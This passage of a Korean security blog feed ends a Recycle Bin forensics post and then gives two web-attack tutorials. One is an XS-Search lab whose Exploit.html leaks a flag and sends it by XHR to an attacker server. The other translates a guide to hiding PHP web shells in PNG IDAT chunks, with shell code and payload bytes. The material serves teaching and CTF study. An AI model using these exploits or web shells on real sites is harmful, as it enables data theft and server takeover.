src="https://user-images.githubusercontent.com/44820723/66716920-4a005780-ee0e-11e9-9668-e5db794767c7.png" alt="$R 파일 구조 in HxD"></p><p>↑↑ $RFMWWK.png 파일의 Hex Value</p><p><hr></p><h4 id="DFC-Digital-Forensic-Challenge-2019-Incident-Response-문제-일부-풀이"><a href="#DFC-Digital-Forensic-Challenge-2019-Incident-Response-문제-일부-풀이" class="headerlink" title="DFC(Digital Forensic Challenge) 2019 Incident Response 문제 일부 풀이."></a><u>DFC(Digital Forensic Challenge) 2019 Incident Response 문제 일부 풀이.</u></h4><p>몇일 전에 끝난 DFC 2019 대회에서 Artifact 부문에서 Recycle Bin 관련 문제가 출제 되었습니다.</p><p>난이도는 높지 않은 수준의 문제 였지만 Recycle Bin 관련 문제인 만큼 같이 확인 하면서 실제로 Recycle Bin을 이용한 사고가 어떻게 일어날 수 있는 지를 같이 문제를 통해서 확인 해 보겠습니다.</p><p><code>문제 : 공격자가 $Recycle.Bin 폴더를 공격 대상 으로 발판을 삼았다. Recycle.Bin 폴더에 생성된 멀웨어의 모든 정보(이름, 생성시간, 수정된 시간, 크기 등)을 찾아라.</code>라는 문제였습니다.</p><p>문제 파일로 $MFT 파일을 주는데 그냥 보기엔 거의 불가능하기 때문에 AnalyzeMFT Tool을 이용해서 .csv 파일로 추출 해보겠습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716933-57b5dd00-ee0e-11e9-989b-1b5b92c542cc.png" alt="use analyzeMFT.exe tool"></p><p>MFT.csv 파일을 열어서 $Recycle.bin를 필터링에 넣어서 추출 하면 아래와 같이 확인 할 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716936-6a301680-ee0e-11e9-85e1-de549bb9146f.png" alt="MFT.csv data"></p><p>위의 이론적인 휴지통 내용을 잘 읽어 보신 분이라면 /<h7>$</h7>Recycle.Bin/{USER SID}/ 하위에 데이터가 들어가게 됩니다. 하지만 141290 오프셋의 데이터를 보면 /<h7>$</h7>Recycle.Bin/7.exe 가 보입니다. 어떤 SID 하위에 있는 것이 아닌 SID와 동일한 경로에 있습니다.</p><p>이런 식으로 악성코드를 $Recycle.Bin에 은닉을 하기도 합니다.</p><p>그리고 실제로 디스크를 분석할때 Recycle.Bin 파일을 우선적으로 분석을 하기도 합니다.</p><p>그정도로 많은 데이터가 담겨 있기 때문입니다.</p><p><hr></p><h4 id="추후-개선-해야-할-점"><a href="#추후-개선-해야-할-점" class="headerlink" title="추후 개선 해야 할 점."></a><u>추후 개선 해야 할 점.</u></h4><p>해당 글은 Windows XP 의 INFO2 구조나 데이터 표현 방식, Windows 10의 <h7>$I</h7>, <h7>$R</h7>에 대한 구조와 표현 방식이 설명 되어 있습니다. 휴지통에서 이러한 데이터가 있구나 라는 정도를 파악 하기 까지는 좋지만 궁극적으로 디스크에서 INFO2 FILE 이나 $I FILE을 바탕으로 삭제된 파일을 카빙하는 방법도 공부 후 설명할 필요가 있을 것으로 생각이 됩니다.</p><p>추후에 디스크에서 메타데이터를 분석하고 휴지통 파일 복구에 대해서 공부하게 되면 해당 글을 수정하여 아래에 첨부할 예정 입니다.</p><p><hr></p><h4 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h4><p><a href="http://forensic-proof.com/archives/288" target="_blank" rel="noopener">http://forensic-proof.com/archives/288</a></p><p><a href="https://www.raymond.cc/blog/what-is-info2-file-hidden-in-recycled-or-recycler-folder/" target="_blank" rel="noopener">https://www.raymond.cc/blog/what-is-info2-file-hidden-in-recycled-or-recycler-folder/</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/14/Forensic/%E3%84%B4%20Research/Forensics_Analysis_of_Recycle_Bin/#disqus_thread</comments>
    </item>
    
    <item>
      <title>XS Search Attack</title>
      <link>https://defenit.kr/2019/10/06/Web/%E3%84%B4%20Research/XS-SEARCH__ATTACK/</link>
      <guid>https://defenit.kr/2019/10/06/Web/%E3%84%B4%20Research/XS-SEARCH__ATTACK/</guid>
      <pubDate>Sat, 05 Oct 2019 16:07:41 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;Cross-Site-Search-XS-Search-Attack&quot;&gt;&lt;a href=&quot;#Cross-Site-Search-XS-Search-Attack&quot; class=&quot;headerlink&quot; title=&quot;Cross-Site Search(XS-Sea
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="Cross-Site-Search-XS-Search-Attack"><a href="#Cross-Site-Search-XS-Search-Attack" class="headerlink" title="Cross-Site Search(XS-Search) Attack"></a><strong>Cross-Site Search(XS-Search) Attack</strong></h3><p>포스팅할 주제는 XS-Search Attack 입니다.</p><p>(XS-search) 공격은 브라우저가 검색에 대한 결과 값에 대한 차이점을 사용하여 동일한 출처 정책(SOP)을 우회하고 민감한 정보를 추출하는 공격 기법입니다.</p><p>아래 그림을 통하여 쉽게 이해를 해보도록 할게요.</p><p><img src="https://k.kakaocdn.net/dn/bldyVG/btqyQ5f2amQ/4PpwoMeaW0PyWY6Ra9ro5K/img.png" alt="img"></p><p>즉 희생자(신데렐라)가 공격자의 악성스크립트(빨간악마)를 접근 하였을 때 해당 스크립트를 통하여 희생자가 현재 접속한 사이트(Gmail)에 정보를 빼내올 수 있는 공격기법입니다.</p><hr><p>일단 공격기법을 이해하려면 SOP와 CORS에 대한 이해가 있으면 좋아 간단히 설명합니다.</p><ul><li><p>동일출처정책(Same Origin Policy)</p><p> 자바스크립트(XMLHttpRequest,Fetch)로 다른 웹 페이지에 접근을 할때는 같은 출처의 페이지에만 접근이 가능하다는것을 뜻합니다.</p></li></ul><p>여기서 같은 출처(Origin)은 프로토콜 , 호스트명, 포트가 같음을 의미합니다.</p><p>허나 웹 애플리케이션을 개선시키기 위해 CORS라는것이 도입되었습니다.</p><ul><li><p>교차 출처 자원 공유(Cross-Origin Resource Sharing)</p><p> 다른 도메인의 웹 페이지 스크립트에서 자원을 주고 받을 수 있게 해주는 개념입니다.</p></li></ul><p>SOP와 CORS에 개념과 자세한 설명은  아래 링크를 참조해주세요.</p><p>SOP : <a href="https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy﻿</a></p><p>CORS : <a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/ko/docs/Web/HTTP/Access_control_CORS</a></p><hr><h2 id="lt-실습-gt"><a href="#lt-실습-gt" class="headerlink" title="&lt;실습&gt;"></a><strong>&lt;실습&gt;</strong></h2><p>아래 실습 예제를 통해 XS-SEARCH 이해를 해보도록 하겠습니다.</p><p>실습 내용은 35c3ctf - filemanager 내용을 참조하였으며 XS-SEARCH 포인트를 iframe으로 변경하여 테스트하였습니다.</p><p><strong>Search.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/search")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">query = request.args.get(<span class="string">'q'</span>)</span><br><span class="line">FLAG = <span class="string">"35C3_iframe_test_win"</span></span><br><span class="line">result = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> query <span class="keyword">and</span> query <span class="keyword">in</span> FLAG:</span><br><span class="line">result = &#123;<span class="string">'title'</span> : <span class="string">'flag'</span>, <span class="string">'content'</span>: FLAG&#125;</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'search.html'</span>, result=result, query=query)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p><strong>search.html</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> result %&#125;</span><br><span class="line">&lt;h1&gt;&#123;&#123; result.title &#125;&#125;&lt;/h1&gt;</span><br><span class="line">&lt;pre&gt;&#123;&#123; result.content &#125;&#125;&lt;/pre&gt;</span><br><span class="line">&lt;iframe src="" name="frame_target" style="width:100%; height:400px;"&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">((=&gt;&#123;</span><br><span class="line"><span class="keyword">for</span> (let pre of document.getElementsByTagName(<span class="string">'pre'</span>)) &#123;</span><br><span class="line">let text = pre.innerHTML;</span><br><span class="line">let q = <span class="string">'&#123;&#123;query&#125;&#125;'</span>;</span><br><span class="line">let idx = text.indexOf(q);</span><br><span class="line">pre.innerHTML = <span class="string">'$&#123;text.substr(0, idx)&#125;&lt;mark&gt;$&#123;q&#125;&lt;/mark&gt;$&#123;text.substr(idx+q.length)&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">&lt;h1&gt; no results&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>웹 서버에서 구동되는 소스이며 해당 기능은 아래 그림과 같습니다.</p><hr><p>q=1을 입력한 결과입니다.</p><p><img src="https://k.kakaocdn.net/dn/dgQtgT/btqyQzoBWkH/pOpvaNFtkcMGI82J8rj4A1/img.png" alt="img"></p><p>q=3을 입력한 결과입니다.</p><p><img src="https://k.kakaocdn.net/dn/lnRf0/btqyPVThG7o/WEe4iO4w5HmJOmbO1uQdG1/img.png" alt="img" style="zoom:80%;"></p><p>q=1 ,q=3 을 입력하였을 때 여기서 중요한점은 두개의 결과값의 화면상 차이가 있다는 점인데요.</p><p>즉 브라우저 화면 내 차이점을 통하여 데이터를 Leak 할 수 있는 공격이 XS-Search attack 입니다.</p><p>여기서 브라우저 화면 내 차이점은 Iframe  갯수입니다. </p><hr><p>이제 희생자가 악의적인 스크립의 접근하였을때 나타나는 결과에 대해 알아봅시다.</p><p>아래는 악의적인 스크립트 소스입니다.</p><p><strong>Exploit.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>exploit<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> chars=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> charLen = chars.length;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ENDPOINT = <span class="string">"http://127.0.0.1:5000/search?q="</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">leak, charCounter</span>) </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> curChar = chars[charCounter];</span></span><br><span class="line"><span class="javascript">x.setAttribute(<span class="string">"src"</span>, <span class="string">'http://127.0.0.1:5000/search?q='</span> + leak + curChar);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(x);</span></span><br><span class="line"><span class="javascript">x.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(x.contentWindow.frames.length != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">'GET'</span>, <span class="string">'http://192.168.232.137/?cmd='</span>+leak, <span class="literal">true</span>); </span></span><br><span class="line"><span class="javascript">xhr.withCredentials = <span class="literal">true</span>; </span></span><br><span class="line"><span class="javascript">xhr.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"leak = "</span> + leak + curChar);</span></span><br><span class="line">leak += curChar</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">search(leak , (charCounter +1 ) % chars.length);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">search(<span class="string">"3"</span>,<span class="number">0</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>희생자가 127.0.0.1:5000/search 과 연결이 되어있을 때 해당 악의적인 스크립트의 접근한다면 아래와 같은 결과를 확인할 수 있습니다.</p><p><strong>Exploit.html 화면</strong></p><p><img src="https://k.kakaocdn.net/dn/c3kXrl/btqyQLh2I6y/oSk0aFuOs6WrWYgV0wGTm0/img.png" alt="img"></p><p>즉 악의적인 스크립트가 실행되는 Exploit.html 에서는 CORS 정책을 위반하여 위와 같은 오류를 발생시켜 데이터를 출력시킬 수 없다는 내용이 출력됩니다.  CORS 정책은 브라우저에 의해 Blocking 되어 출력이 되지는 않지만 이미 데이터는 XMLHttpRequest를 통하여 서버측에 전송되어버렸기 때문에 저희는 아래와 같이 해당 데이터를 받아 확인할 수 있게 됩니다.</p><p><strong>공격자측 서버의 웹로그 화면</strong></p><p><img src="https://k.kakaocdn.net/dn/bh9vGi/btqyQrj3Ji1/VKLrTvbJdtkEa3ss7neox0/img.png" alt="img"></p><p>즉 공격자는 검색 결과값에 대한 브라우저의 차이점에 대한 판별로 한글자씩 데이터를 Leak 할 수 있기에 Flag 의 문자열을 알아 낼 수 있게 됩니다.</p><p>Flag : 35C3_iframe_test_win</p><hr><p><strong>레퍼런스</strong></p><p><strong><a href="https://www.owasp.org/images/a/a7/AppSecIL2015_Cross-Site-Search-Attacks_HemiLeibowitz.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/a/a7/AppSecIL2015_Cross-Site-Search-Attacks_HemiLeibowitz.pdf</a></strong></p><p><strong><a href="https://www.youtube.com/watch?v=HcrQy0C-hEA" target="_blank" rel="noopener">https://www.youtube.com/watch?v=HcrQy0C-hEA﻿</a></strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/06/Web/%E3%84%B4%20Research/XS-SEARCH__ATTACK/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[번역] Encoding-Web-Shells-in-PNG-IDAT-chunks</title>
      <link>https://defenit.kr/2019/10/03/Web/%E3%84%B4%20Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/</link>
      <guid>https://defenit.kr/2019/10/03/Web/%E3%84%B4%20Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/</guid>
      <pubDate>Thu, 03 Oct 2019 08:52:51 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Encoding-Web-Shells-in-PNG-IDAT-chunks&quot;&gt;&lt;a href=&quot;#Encoding-Web-Shells-in-PNG-IDAT-chunks&quot; class=&quot;headerlink&quot; title=&quot;Encoding Web She
        
      
      </description>
      
      <content:encoded><![CDATA[<h1 id="Encoding-Web-Shells-in-PNG-IDAT-chunks"><a href="#Encoding-Web-Shells-in-PNG-IDAT-chunks" class="headerlink" title="Encoding Web Shells in PNG IDAT chunks"></a>Encoding Web Shells in PNG IDAT chunks</h1><p>아래는 PNG 파일 포맷을 이용하여 웹쉘을 삽입하는 내용에 대한 글이다.</p><p>외국문서인 만큼 영어로 되어있길래 잘 이해가 되지 않아 번역을 하며 자세히 알아보았다.</p><p>국내의 보안인들에게 도움이 되었으면 한다.<br>(오역이 있을 수 있습니다.)</p><p>출처 : <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><hr><p>만약 너가 이미지 안에 웹쉘을 신중하게 넣는다면, 너는 서버 측 필터를 우회할 수 있고 쉘을 구체화할 수 있을 것이다(그리고 나는 주석이나 metadata에 인코딩된 데이터를 넣는것에 대해 말하는 것이 아니다) - 해당 포스트는 당신에게 오직 <a href="https://www.php.net/manual/en/book.image.php/" target="_blank" rel="noopener">GD</a>만을 이용하여 PNG IDAT chunks 에 PHP 쉘을 작성할 수 있다는 것을 보여줄 것이다.</p><p>만약 너가 파일 시스템에 코드를 작성할 수 없다면 <a href="https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/" target="_blank" rel="noopener">서버의 미흡한 설정</a> 혹은 Local File Inclusion을 exploit 하는 것은 곤란할 수 있다. - 이미지 업로드를 허용하는 과거의 어플리케이션은 metadate나 변조된 이미지를 통해 코드를 서버에 업로드하는 제한된 방법을 제공했다. 그러나 꽤 종종 이미지들은 크기가 조정되거나 회전되거나 메타 데이터가 제거되거나 다른 파일 형식으로 인코딩되어 웹쉘 페이로드가 효과적으로 제거된다.<br><br><br></p><h3 id="PNG-파일-형식-기초"><a href="#PNG-파일-형식-기초" class="headerlink" title="PNG 파일 형식 기초"></a>PNG 파일 형식 기초</h3><p>PNG 파일 포맷(우리는 인덱싱된 것이 아니라 true-color PNG 파일에 초점을 둘 것이다)에서 IDAT chunk는 픽셀 정보를 저장한다. 우리가 PHP 쉘을 저장할 곳은 이 chunk이다. 이제 우리는 픽셀이 항상 RGB color 채널을 나타내는 3 byte로 저장된다고 가정하자.</p><p>raw 이미지가 PNG로 저장이 될 때, 이미지의 각 행은 각 바이트 단위로 <a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html" target="_blank" rel="noopener">필터링되고</a> 행은 사용된 필터 유형을 나타내는 번호(0x01 ~ 0x05)가 접두사로 붙으며, 다른 행은 다른 필터를 사용할 수 있다. 이렇게 하는 이유는 <a href="http://www.w3.org/TR/PNG-Rationale.html" target="_blank" rel="noopener">압축 비율을 향상</a>시키기 위함이다. 모든 행이 필터링되면 그것들은 IDAT chunk를 형성하기 위해 모두 DEFLATE 알고리즘으로 압축된다.</p><p><img src="https://www.idontplaydarts.com/images/flow1.png" alt="flow1"></p><p>그래서 만약 우리가 데이터를 raw 이미지로 입력하고 쉘로 저장하려면 우리는 PNG 라인 필터와 DEFLATE 알고리즘을 둘다 무산시킬 필요가 있다. 거꾸로 작업하는 것이 더 쉬우므로 우리는 DELFATE 부터 시작할 것이다.<br><br><br></p><h3 id="Step-1-쉘을-형성하기-위해-문자열-압축하기"><a href="#Step-1-쉘을-형성하기-위해-문자열-압축하기" class="headerlink" title="Step 1. 쉘을 형성하기 위해 문자열 압축하기"></a>Step 1. 쉘을 형성하기 위해 문자열 압축하기</h3><p>쉘을 형성하기 위해서는 압축하는 문자열을 설계하는 것이 이상적이다. 이는 생각하는 것만큼 어렵지는 않지만 분명히 문자열에는 반복되는 코드 블록이 포함될 수 없다(또는 압축될 것이다). 사실, 쉘이 압축되는 것으로부터 막기 위해서는 길이가 2글자 이상 반복되는 부분 문자열이 없도록 설계해야 한다. 이것은 우리가 문자열을 짧게 유지해야한다는 것을 의미한다 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`$_GET[<span class="number">0</span>]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이렇게 간단하다면 얼마나 좋을까 :) 안타깝게도, 만약 너가 위의 문자열을 DEFLATE로 실행하면 많은 쓰레기가 나오게 되는데, 그 문자열은 압축되지 않았지만 DEFLATE 결과는 byte boundary에서 시작하지 않고 MSB가 아닌 LSB를 사용하여 인코딩된다. 자세히 말하지는 않겠지만 당신은 <a href="https://pograph.wordpress.com/2009/06/04/notes-on-gzip-and-deflate-format/" target="_blank" rel="noopener">Pograph의 weblog</a>에서 더 많은 것을 읽을 수 있다.</p><p>인코딩하기 가장 쉬운 쉘은 상위 케이스에 있다 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_GET[<span class="number">0</span>]($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>당신은 $_GET[0]을 <code>shell_exec</code>로 지정하고 $_POST[1] 파라미터에 실행하기 위한 쉘 명령어를 전달함으로써 사용할 수 있다.</p><p>나는 위의 문장을 DEFLATES 포맷으로 문자열을 설계했으며, 이 문자열의 이점은 페이로드의 첫번째 바이트가 0x00에서 0x04까지 변경될 수 있고 압축된 문자열도 여전히 읽을 수 있다는 것이다. - 이것은 다음 단계에서 마주할 PNG 필터를 회피하는데 중요하다.</p><p><span style="color:green">03</span>a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310</p><p>안타깝게도 PNG 라이브러리가 이미지 행을 먼저 필터링하고 DEFLATE를 적용하기 때문에 이것을 초기 원시 이미지에 포함시키고 IDAT chunk에 포함시킬 수는 없다.<br><br><br></p><h3 id="Step-2-PNG-라인-필터-우회"><a href="#Step-2-PNG-라인-필터-우회" class="headerlink" title="Step 2. PNG 라인 필터 우회"></a>Step 2. PNG 라인 필터 우회</h3><p><a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html" target="_blank" rel="noopener">5가지 종류의 필터</a>가 있으며 PNG encoder가 각 라인에 사용할 필터를 결정한다. 이제 문제는 필터로 전달될 때 1단계의 문자열이 생성되는 문자열을 구성해야 한다는 것이다. </p><p>이미지에 오직 1행의 payload만 포함되어있는 한 (이미지의 나머지 부분ì 검은 색과 같이 일정한 색상이어야 함) 당신이 마주치는 두 필터는 1과 3일 것이며, 만약 이미지의 왼쪽 상단에 페이로드가 남아있는 경우 그것을 더욱 단순화하기 위해 우리는 다음과 같이 두 필터의 역순을 쓸 수 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reverse Filter 1</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $s; $i++)</span><br><span class="line">   $p[$i+<span class="number">3</span>] = ($p[$i+<span class="number">3</span>] + $p[$i]) % <span class="number">256</span>;</span><br><span class="line"><span class="comment">// Reverse Filter 3 </span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $s; $i++)</span><br><span class="line">   $p[$i+<span class="number">3</span>] = ($p[$i+<span class="number">3</span>] + floor($p[$i] / <span class="number">2</span>)) % <span class="number">256</span>;</span><br></pre></td></tr></table></figure><p>만약 필터 3만 사용하여 payload를 인코딩하면 PNG 인코더는 필터 1을 사용하려 인코딩하려할 것이고, 필터 1을 사용하여 인코딩하려하면 PNG 인코더는 필터0을 사용하려 할 것이다 - 결국 당신은 루프에 빠지게 된다.</p><p>PNG 인코더가 선택하는 필터를 컨트롤하기 위해 필터 3과 필터 1의 역으로 2단계에서 쉘을 인코딩하고 이를 연결하여 인코더가 payload에 대해 필터 3을 선택하도록 하며 원시 이미지의 데이터가 2단계에서 코드로 변환되도록 한다. 이 코드는 IDAT chunk에 저장된 웹 쉘로 압축된다.</p><p>이 방법을 사용하면 아래의 payload가 생성된다. - 필터 3은 녹색, 필터 1은 회색이다.<br>아러니하게 필터를 사용하면 실제로 페이로드가 더 커진다.</p><p><span style="color:green">0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc</span>, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33<br><br><br></p><h3 id="Step-3-Raw-Image-구성하기"><a href="#Step-3-Raw-Image-구성하기" class="headerlink" title="Step 3. Raw Image 구성하기"></a>Step 3. Raw Image 구성하기</h3><p>GD가 PNG 파일로 인코딩할 raw image를 구성할 때 이미지의 첫번째 행에 payload를 배치하는 것은 중요하다. 이 시점에서 위에서 제공한 페이로드는 작은 이미지(최대 ~40px by ~ 40px) 에서만 작동하지만 더 큰 이미지에 대해서도 payload를 구성할 수 있다.</p><p>페이로드는 다음과 같이 RGB byte 시퀀스로 인코딩되어야 한다:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">        <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">        <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">        